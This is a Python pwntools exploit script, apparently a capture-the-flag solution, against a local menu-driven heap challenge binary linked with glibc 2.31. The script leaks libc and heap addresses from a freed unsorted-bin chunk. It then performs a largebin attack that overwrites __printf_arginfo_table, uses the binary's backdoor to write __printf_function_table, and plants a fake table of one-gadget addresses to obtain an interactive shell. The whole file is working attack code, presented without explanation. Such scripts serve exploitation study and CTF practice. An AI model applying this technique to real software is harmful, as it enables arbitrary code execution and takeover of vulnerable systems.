from pwn import*
p = process("./pwn")
libc = ELF("./libc-2.31.so")
def add(siz,cot):
    p.sendlineafter("choice: \n","1")
    p.sendlineafter("name: ","Seg_Tree")
    p.sendlineafter("desciption: ",str(siz))
    p.sendlineafter("desciption: ",cot)

def fre(idx):
    p.sendlineafter("choice: \n","2")
    p.sendlineafter("people: ",str(idx))

def edi(idx,cot):
    p.sendlineafter("choice: \n","3")
    p.sendlineafter("people: ",str(idx))
    p.sendlineafter("people: ","Seg_Tree")
    p.sendlineafter("desciption: ",cot)

def sho(idx):
    p.sendlineafter("choice: \n","4")
    p.sendlineafter("people: ",str(idx))

def backdoor(addr,char):
    p.sendlineafter("choice: \n","255")
    p.sendlineafter("IU?\n","y")
    p.sendafter("reward!\n",addr)
    p.sendline(char)

add(0x520,"AAAAAAAA")           #0
add(0x510,"BBBBBBBB")           #1
add(0x500,"CCCCCCCC")           #2
add(0x510,"DDDDDDDD")           #3
fre(0)
fre(2)
sho(0)
unsortedbin = u64(p.recv(8))
libc_base = unsortedbin - 0x1Ecbe0
largebin = libc_base + 0x1ed010
print(hex(libc_base))
heap2 = u64(p.recv(8))
heap0 = heap2 - 0xa50
print(hex(heap0))
system = libc_base + libc.symbols["system"]
__printf_function_table = libc_base + 0x1F1318
__printf_arginfo_table = libc_base + 0x1ED7B0
ogg = libc_base + 0xe3afe
ogg = libc_base + 0xe3b01
print(hex(__printf_arginfo_table))
backdoor(p64(__printf_function_table),'a')

fake_table = p64(ogg)*0x80
payload = p64(largebin) + p64(largebin) + p64(heap0) + p64(__printf_arginfo_table - 0x20)

add(0x500,fake_table)           #4/former 2
fre(2)
edi(0,payload)
add(0x530,"put the unsorted chunk into large bin")          #5
# fre(4)
# gdb.attach(p,"b*$rebase(0x1d98)")
p.sendlineafter("choice: \n","H4cked_6y_Seg_Tree")
p.interactive()
